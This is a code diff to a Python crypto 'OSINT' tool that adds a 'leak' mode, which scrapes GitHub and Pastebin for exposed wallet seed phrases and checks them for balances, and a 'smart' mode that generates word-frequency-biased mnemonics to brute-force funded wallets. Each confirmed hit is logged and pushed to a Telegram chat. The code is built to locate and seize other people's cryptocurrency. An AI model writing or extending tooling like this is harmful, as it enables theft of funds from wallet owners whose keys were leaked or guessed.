@@ -3,9 +3,11 @@
 Supports BTC, ETH, BSC, Polygon, and SOL. Accepts mnemonic phrases,
 private keys, or raw addresses as input.
 
-Operates in two scan modes:
+Operates in four scan modes:
 - "random": generate random mnemonics and check balances (RandomScanner)
 - "targeted": derive and check known mnemonics / account ranges (targeted_search)
+- "leak": scan GitHub/Pastebin for leaked mnemonics and verify balances
+- "smart": AI word-frequency biased mnemonic generation and verification
 """
 
 import asyncio
@@ -102,6 +104,14 @@ class CryptoBalanceTool(BaseOSINTTool):
         # If scan_mode is explicitly "random", delegate to RandomScanner
         if scan_mode == "random":
             return await self._run_random_scan(scan_id, started_at, **kwargs)
+
+        # If scan_mode is "leak", delegate to leak scanner
+        if scan_mode == "leak":
+            return await self._run_leak_scan(scan_id, started_at, **kwargs)
+
+        # If scan_mode is "smart", delegate to smart generator
+        if scan_mode == "smart":
+            return await self._run_smart_scan(scan_id, started_at, **kwargs)
 
         # If input is "random" literal, run random scan
         if target.strip().lower() == "random":
@@ -334,6 +344,210 @@ class CryptoBalanceTool(BaseOSINTTool):
                 "mode": "random",
                 "workers": workers,
                 "duration": duration,
+            },
+            started_at=started_at,
+            completed_at=datetime.utcnow(),
+        )
+
+    async def _run_leak_scan(
+        self, scan_id: str, started_at: datetime, **kwargs
+    ) -> ScanResult:
+        """Delegate to leak scanner (GitHub + Pastebin) for leaked mnemonic discovery."""
+        from src.modules.crypto.balance.leak_scanner import (
+            GitHubLeakScanner,
+            PasteSiteScanner,
+            verify_and_alert,
+        )
+        from src.modules.crypto.balance.hit_logger import HitLogger
+        from src.modules.crypto.balance.scanner_coordinator import ScannerCoordinator
+        import os
+
+        hit_logger = HitLogger(
+            db_path="wallet_hits.db",
+            telegram_token=os.environ.get("TELEGRAM_BOT_TOKEN", ""),
+            telegram_chat_id=os.environ.get("TELEGRAM_CHAT_ID", ""),
+        )
+        await hit_logger.start()
+
+        coordinator = ScannerCoordinator(chains=self.chains)
+        await coordinator.start()
+
+        github_token = os.environ.get("GITHUB_TOKEN", "")
+        github_scanner = GitHubLeakScanner(github_token=github_token, hit_logger=hit_logger)
+        paste_scanner = PasteSiteScanner(hit_logger=hit_logger)
+
+        total_candidates = 0
+        total_hits = 0
+        errors: list[str] = []
+        findings: list[Finding] = []
+
+        try:
+            # GitHub scan
+            github_findings = await github_scanner.scan(max_results=30)
+            total_candidates += len(github_findings)
+
+            for finding in github_findings:
+                if not coordinator.is_mnemonic_seen(finding.mnemonic_candidate):
+                    coordinator.mark_mnemonic_seen(finding.mnemonic_candidate, source="leak")
+                    result = await verify_and_alert(
+                        finding.mnemonic_candidate,
+                        chains=self.chains,
+                        hit_logger=hit_logger,
+                    )
+                    if result and result.has_balance:
+                        total_hits += 1
+
+            # Pastebin scan
+            paste_findings = await paste_scanner.scan(max_pastes=30)
+            total_candidates += len(paste_findings)
+
+            for finding in paste_findings:
+                if not coordinator.is_mnemonic_seen(finding.mnemonic_candidate):
+                    coordinator.mark_mnemonic_seen(finding.mnemonic_candidate, source="leak")
+                    result = await verify_and_alert(
+                        finding.mnemonic_candidate,
+                        chains=self.chains,
+                        hit_logger=hit_logger,
+                    )
+                    if result and result.has_balance:
+                        total_hits += 1
+
+        except Exception as e:
+            errors.append(str(e))
+        finally:
+            await coordinator.stop()
+            await hit_logger.close()
+
+        findings.append(Finding(
+            id=f"leak-scan-{scan_id}",
+            module=self.name,
+            title="Leak scan completed",
+            description=(
+                f"Found {total_candidates} mnemonic candidates from GitHub/Pastebin, "
+                f"{total_hits} confirmed hits"
+            ),
+            severity=Severity.HIGH if total_hits > 0 else Severity.INFO,
+            confidence=1.0,
+            tags=["crypto", "leak_scan", "summary"],
+            raw_data={
+                "candidates_found": total_candidates,
+                "hits_confirmed": total_hits,
+                "errors": errors,
+            },
+        ))
+
+        return ScanResult(
+            scan_id=scan_id,
+            module=self.name,
+            target="leak",
+            status="ok" if not errors else "partial",
+            findings=findings,
+            metadata={
+                "mode": "leak",
+                "candidates": total_candidates,
+                "hits": total_hits,
+            },
+            started_at=started_at,
+            completed_at=datetime.utcnow(),
+        )
+
+    async def _run_smart_scan(
+        self, scan_id: str, started_at: datetime, **kwargs
+    ) -> ScanResult:
+        """Delegate to smart generator for AI word-frequency biased scanning."""
+        from src.modules.crypto.balance.ai_analyzer import WordFrequencyAnalyzer
+        from src.modules.crypto.balance.smart_generator import SmartMnemonicGenerator
+        from src.modules.crypto.balance.scanner_coordinator import ScannerCoordinator
+        from src.modules.crypto.balance.hit_logger import HitLogger
+        from src.modules.crypto.balance.deriver import derive_from_mnemonic
+        import os
+
+        iterations = kwargs.get("iterations", 10)
+        hit_logger = HitLogger(
+            db_path="wallet_hits.db",
+            telegram_token=os.environ.get("TELEGRAM_BOT_TOKEN", ""),
+            telegram_chat_id=os.environ.get("TELEGRAM_CHAT_ID", ""),
+        )
+        await hit_logger.start()
+
+        coordinator = ScannerCoordinator(chains=self.chains)
+        await coordinator.start()
+
+        analyzer = WordFrequencyAnalyzer()
+        analyzer.load_from_db()
+        generator = SmartMnemonicGenerator(analyzer)
+
+        total_generated = 0
+        total_hits = 0
+        errors: list[str] = []
+        findings: list[Finding] = []
+
+        try:
+            for _ in range(iterations):
+                mnemonic = generator.generate()
+                if coordinator.is_mnemonic_seen(mnemonic):
+                    continue
+                coordinator.mark_mnemonic_seen(mnemonic, source="smart")
+                total_generated += 1
+
+                addresses = derive_from_mnemonic(mnemonic, chains=self.chains, count=1)
+                for addr in addresses:
+                    try:
+                        result = await coordinator.check_balance(
+                            addr.address,
+                            next(c for c in self.chains if c.name == addr.chain),
+                            addr.derivation_path,
+                        )
+                        if result.balance > 0:
+                            total_hits += 1
+                            mnemonic_hash = ScannerCoordinator.hash_mnemonic(mnemonic)
+                            await hit_logger.log_hit(
+                                address=addr.address,
+                                chain=addr.chain,
+                                balance=result.balance,
+                                usd_value=result.usd_value,
+                                mnemonic_hash=mnemonic_hash,
+                                derivation_path=addr.derivation_path,
+                                source="smart_scan",
+                            )
+                    except Exception as e:
+                        errors.append(f"{addr.chain}: {e}")
+
+        except Exception as e:
+            errors.append(str(e))
+        finally:
+            await coordinator.stop()
+            await hit_logger.close()
+
+        findings.append(Finding(
+            id=f"smart-scan-{scan_id}",
+            module=self.name,
+            title="Smart scan completed",
+            description=(
+                f"Generated {total_generated} AI-biased mnemonics, "
+                f"{total_hits} confirmed hits"
+            ),
+            severity=Severity.HIGH if total_hits > 0 else Severity.INFO,
+            confidence=1.0,
+            tags=["crypto", "smart_scan", "summary"],
+            raw_data={
+                "mnemonics_generated": total_generated,
+                "hits_confirmed": total_hits,
+                "errors": errors,
+            },
+        ))
+
+        return ScanResult(
+            scan_id=scan_id,
+            module=self.name,
+            target="smart",
+            status="ok" if not errors else "partial",
+            findings=findings,
+            metadata={
+                "mode": "smart",
+                "iterations": iterations,
+                "generated": total_generated,
+                "hits": total_hits,
             },
             started_at=started_at,
             completed_at=datetime.utcnow(),
